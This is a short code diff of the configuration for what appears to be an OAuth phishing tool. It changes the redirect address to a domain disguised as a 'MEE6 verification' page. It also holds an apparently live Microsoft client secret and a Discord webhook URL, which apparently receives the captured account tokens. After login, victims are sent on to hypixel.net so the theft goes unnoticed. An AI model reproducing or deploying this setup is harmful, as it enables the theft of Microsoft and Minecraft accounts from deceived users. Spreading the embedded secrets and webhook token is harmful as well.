@@ -1,7 +1,7 @@
 //Change these
 const client_secret = '6GB8Q~eqkjsODQaH1ErEzI4MHsWvbX-JnFm1-c40' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '2524d81a-75dd-493b-a92c-88e4caf9ce83'
-const redirect_uri = 'https://oauth1-8.onrender.com'
+const redirect_uri = 'https://mee6-verification-yv92.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1084254229004304495/9jgmidJ5kwHUhRTrEJt6z1Ttv80mPa3fr4oJAwZQZz4JUd5hxYanfz0iqRhUpv6h1IA1'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
